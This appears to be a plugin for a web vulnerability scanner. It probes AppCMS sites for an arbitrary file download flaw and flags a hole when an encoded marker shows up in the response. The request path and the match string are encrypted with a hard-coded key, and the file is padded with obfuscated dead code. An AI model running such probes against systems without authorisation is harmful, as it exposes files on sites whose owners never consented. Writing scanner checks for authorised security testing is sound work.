# -*- coding: utf-8 -*-
import binascii,re
import fcntl

from decode import Decoder
de_key = 'a250c30aace7024c05ceab6a9b1ac3e470111cb49643e8cd93aeb37edf1602ee'
decode = Decoder(binascii.a2b_hex(de_key)).decode
from dummy import *
from miniCurl import Curl
curl = Curl()
 #Embedded file name: appcms_file_download.py
if 0:
    i11iIiiIii

def assign(service, arg):
    if service == '''appcms''':
        return (True, arg)
        if 0:
            O0 / iIii1I11I1II1 % OoooooooOO - i1IIi


def audit(arg):
    o0OO00 = arg
    oo, oo, i1iII1IiiIiI1, oo, oo = curl.curl(o0OO00 + decode('\x8d \xaai\x82\x97j<:\xbb\xd9\x06\xa6W\x94\x94\x07Ke\x8c\xe3\x0f\x81\xf4\xf9\xcc\x804\xb3Z0\xa0\xd42\xaeP\xdc\xbd{yo\xac\x99_\xeeV\xad\xa6\x1fr]\x89\xabe\x9c\xb4\xe3\xcb\x8e\x14\xafq'))
    if i1iII1IiiIiI1 and i1iII1IiiIiI1.find(decode('\xe6\x12\x9cI\xe4\xa6P\x1f@\x9a')) != -1:
        security_hole(o0OO00)
        if 0:
            ooOoO0O00 * IIiIiII11i


if __name__ == '__main__':
    from dummy import *

#KEY---a250c30aace7024c05ceab6a9b1ac3e470111cb49643e8cd93aeb37edf1602ee---